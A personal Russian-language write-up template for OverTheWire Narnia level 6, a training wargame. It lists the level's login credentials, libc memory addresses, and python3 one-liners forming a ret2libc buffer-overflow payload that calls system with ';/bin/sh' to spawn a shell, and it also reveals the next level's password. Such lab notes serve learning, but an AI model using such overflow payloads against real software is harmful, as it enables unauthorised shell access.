---
tags:
  - ctf
created: 2026-05-04
---

# `Level [6]` 
> 

## 🔐 Учётные данные
| Параметр | Значение                    |
| -------- | --------------------------- |
| Host     | narnia.labs.overthewire.org |
| Port     | 2226                        |
| Login    | narnia6                     |
| Password | BNSjoSDeGL                  |

## 🎯 Цель уровня
- 
## 🎯 Информация

| Тип информации       | Данные       |
| -------------------- | ------------ |
| адрес EIP с b1       | `0xffffd2fc` |
| адрес /bin/sh        | `0xf7f3ede8` |
| адресс fp            | `0xffffd318` |
| libc адрес           | `0xf7d82000` |
| puts адрес           | `00076a90`   |
| system адрес         | `0x4f8e0`    |
| /bin/sh адрес в libc | `0xf7f3ede8` |
| libc system          | `0xf7dd18e0` |

## 🎯 Инструменты

| Инструмент | Назначение | Использование |
| ---------- | ---------- | ------------- |
|            |            |               |
## 📚 Ключевые команды/Техники
| Команда                                                                                                                                                                                                                   | Описание                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------- |
| `readelf -s /lib32/libc.so.6 \| grep system`                                                                                                                                                                              | получаем адрес систем         |
| `strings -a -t x /lib32/libc.so.6 \| grep "/bin/sh"`                                                                                                                                                                      | получаем адрес /bin/sh в libc |
| `"`python3 -c 'import sys; sys.stdout.buffer.write(b"AAAA"+b"\xe8\xed\xf3\xf7")'`" "`python3 -c 'import sys; sys.stdout.buffer.write(b"BBBBBBBBBBBBBBBB"+b"\xe0\x18\xdd\xf7"+b"AAAA"+b"\xe8\xed\xf3\xf7"+b";/bin/sh")'`"` | победный пейлоад              |

## 💡 Пошаговое решение
| Шаг | Действие                              | Команда/Код                                                                                              |
| --- | ------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| 1   | **Найти адреса** `system` и `/bin/sh` | `readelf -s /lib32/libc.so.6 \| grep system`<br>`strings -a -t x /lib32/libc.so.6 \| grep "/bin/sh"`<br> |
| 2   | Найти смещение b2                     |                                                                                                          |
| 3   | составить пейлоад для b2              | `мусор (нужной длины) + адрес `system` + мусор (4 байта) + `;/bin/sh``                                   |

## 🔍 Результат
Флаг/Пароль: 54RtepCEU0

## 🚪 Переход
-> [Level_6]

## 🔗 Ссылки
- [Название ресурса](URL)
```
"`python3 -c 'import sys; sys.stdout.buffer.write(b"A"*8+b"\xe8\xed\xf3\xf7")'`" "`python3 -c 'import sys; sys.stdout.buffer.write(b"L"*8+b"\xe0\x18\xdd\xf7")'`"
```